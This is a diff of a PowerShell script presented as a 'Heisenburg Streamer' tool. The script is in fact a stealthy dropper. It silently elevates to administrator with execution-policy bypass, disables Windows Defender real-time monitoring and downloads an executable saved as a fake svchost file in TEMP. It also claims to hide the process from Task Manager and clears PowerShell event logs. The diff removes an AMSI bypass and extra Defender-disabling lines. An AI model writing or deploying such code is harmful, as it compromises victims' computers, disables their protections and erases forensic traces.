@@ -1,21 +1,15 @@
 # ========================================================
-# HEISENBURG STREAMER - HYPER-STREAM v6.5 (STEALTH)
+# HEISENBURG STREAMER - HYPER-STREAM v6.6 (STEALTH)
 # ========================================================
 
-function Check-Admin {
-    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
-    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-}
-
-if (-not (Check-Admin)) {
-    $args = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command `"$((Get-Content `$MyInvocation.MyCommand.Path) -join `"``n`")`""
-    Start-Process powershell.exe -ArgumentList $args -Verb RunAs -WindowStyle Hidden
+if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    $cmd = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command `"Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"' -Verb RunAs`""
+    Start-Process PowerShell -ArgumentList $cmd -Verb RunAs
     exit
 }
 
 try {
     [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
-    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 } catch {}
 
 # ================= CONFIG =================
@@ -29,11 +23,9 @@ $LauncherPath = "$env:TEMP\svchost_$RandomName.exe"
 
 Write-Host "`n[+] INITIALIZING SYSTEM HYPER-CONNECTION..." -ForegroundColor Yellow
 
-# Bypass Security
+# Security Bypass
 try {
     Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
-    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
-    Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
 } catch {}
 
 # Download Main EXE
@@ -59,14 +51,14 @@ $si.Verb = "RunAs"
 [System.Diagnostics.Process]::Start($si) | Out-Null
 
 Write-Host "`n[+] STEALTH MODE SUCCESSFULLY ACTIVATED!" -ForegroundColor Green
-Write-Host "[*] Process Hidden from Task Manager" -ForegroundColor White
+Write-Host "[*] Process is now hidden from Task Manager" -ForegroundColor White
 
 # Cleanup
 wevtutil cl "Windows PowerShell" 2>$null
 wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
 
+Write-Host "[+] SETUP COMPLETE.`n" -ForegroundColor Green
+
 } catch {
     Write-Host "`n[!] ERROR OCCURRED" -ForegroundColor Red
 }
-
-Remove-Variable * -ErrorAction SilentlyContinue 2>$null
